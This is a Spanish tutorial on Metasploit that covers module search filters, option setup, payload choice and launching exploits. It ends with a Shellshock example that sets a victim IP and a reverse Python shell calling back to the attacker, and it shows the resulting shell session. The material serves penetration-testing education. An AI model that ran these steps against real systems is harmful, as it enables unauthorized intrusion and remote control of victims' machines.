# 🚀 Búsqueda, Configuración y Lanzamiento de Módulos

El **Metasploit Framework** es un ecosistema inmenso. Su eficacia no reside solo en tener miles de herramientas, sino en la capacidad del *pentester* para navegar por ellas, entender sus requisitos y ejecutarlas con precisión quirúrgica. 🛡️

---

## 🔍 1. El Arte de Buscar: Dominando el comando `search`

La base de datos de Metasploit crece a diario. El comando `search` no es solo un buscador de palabras; es un motor de filtrado potente que permite cruzar datos para encontrar el "arma" exacta.

### 🏷️ Parámetros de Filtrado Esenciales

| Parámetro | Descripción Técnica | Ejemplo de Uso |
| --- | --- | --- |
| `name:` | Filtra por el nombre lógico o subcadena del módulo. | `search name:apache` |
| `type:` | Restringe a una categoría (ej. `exploit`, `auxiliary`, `post`). | `search type:exploit` |
| `platform:` | Filtra por sistema operativo objetivo (ej. `windows`, `linux`). | `search platform:linux` |
| `arch:` | Filtra por arquitectura de CPU (ej. `x64`, `armle`, `mips`). | `search arch:x86` |
| `author:` | Localiza módulos desarrollados por una persona específica. | `search author:hdm` |
| `cve:` | Busca por el año e ID del catálogo CVE oficial. | `search cve:2021-34473` |
| `rank:` | Filtra por la fiabilidad del exploit (ej. `excellent`, `good`). | `search rank:excellent` |
| `ref:` | Busca por referencias como `MS17-010` o `EDB-ID`. | `search ref:MS17-010` |

> [!TIP]
> **Búsqueda Combinada:** Para una precisión total, combina filtros.
> `msf6 > search type:exploit platform:windows cve:2017-0144`
> *Esto te devolverá solo exploits para Windows, altamente fiables y relacionados con EternalBlue.*

![](../Adjuntos/Pasted%20image%2020260105103157.png)

---

## ⚙️ 2. El Ciclo de Vida: Preparación y Configuración

Una vez localizado el módulo, entramos en la fase de configuración. Seguir este orden evitará errores comunes de "conexión fallida".

### 🛠️ Paso 1: Carga y Reconocimiento (`use` e `info`)

Al usar `use`, el prompt cambiará indicando que estás dentro del módulo. **Siempre** ejecuta `info` antes de configurar nada.

* **Rank:** Si el rank es `excellent`, es poco probable que tires el sistema (DoS). Si es `average` o `low`, procede con extrema precaución.
* **Description:** Aquí entenderás si el exploit requiere una configuración especial en el servidor objetivo.

![](../Adjuntos/Pasted%20image%2020260105103332.png)

### 📋 Paso 2: Configuración de Variables (`set`)

El comando `show options` es tu lista de tareas. Debes completar todos los campos donde `Required` sea `yes`.

| Variable | Rol en el Ataque |
| --- | --- |
| **`RHOSTS`** | **Remote Host:** La IP o rango de la víctima (objetivo). |
| **`RPORT`** | **Remote Port:** El puerto donde escucha el servicio vulnerable. |
| **`LHOST`** | **Local Host:** Tu dirección IP (necesaria para que la víctima te "devuelva" la conexión). |
| **`LPORT`** | **Local Port:** El puerto en tu máquina que recibirá la shell (por defecto suele ser 4444). |

![](../Adjuntos/Pasted%20image%2020260105103410.png)

### 📦 Paso 3: Selección del Payload (`set payload`)

El exploit abre la brecha, pero el payload es lo que te da el control.

1. Ejecuta `show payloads` para ver cuáles son compatibles con el exploit cargado.
   
   ![](../Adjuntos/Pasted%20image%2020260105103451.png)
   
1. Selecciona uno: `set payload windows/x64/meterpreter/reverse_tcp`.
   
   ![](../Adjuntos/Pasted%20image%2020260105103541.png)

---

## 🚀 3. Verificación y Disparo: `check` y `exploit`

> [!IMPORTANT]
> **¡Usa el comando `check`!** 🛡️
> No todos los módulos lo soportan, pero si está disponible, permite saber si el objetivo es vulnerable **sin lanzar el ataque real**. Es la forma más ética y profesional de trabajar.

Finalmente, para lanzar la acción, tienes dos alias:

* **`exploit`**: Tradicionalmente usado para módulos de explotación.
* **`run`**: Comúnmente usado para módulos auxiliares y de post-explotación.

---

## 📖 4. Ejemplo Práctico: Caso Shellshock (`CVE-2014-6271`)

Este flujo de trabajo resume todo lo aprendido aplicado a un entorno real:

```bash
# 1. Buscar el exploit
msf6 > search shellshock type:exploit

# 2. Cargar el módulo
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec

# 3. Configurar el objetivo y la ruta vulnerable
msf6 exploit(...) > set RHOSTS 10.10.12.150
msf6 exploit(...) > set TARGETURI /cgi-bin/vulnerable.sh

# 4. Configurar tu IP para recibir la conexión (Reverse Shell)
msf6 exploit(...) > set LHOST 10.10.1.25

# 5. Elegir el Payload (una shell de Python en este caso)
msf6 exploit(...) > set payload cmd/unix/reverse_python

# 6. ¡Verificar y Lanzar!
msf6 exploit(...) > check
msf6 exploit(...) > exploit

```

**Resultado esperado:**
`[*] Command shell session 1 opened (10.10.1.25:4444 -> 10.10.12.150:48322)`
¡Felicidades! Has obtenido acceso al sistema. 🎉

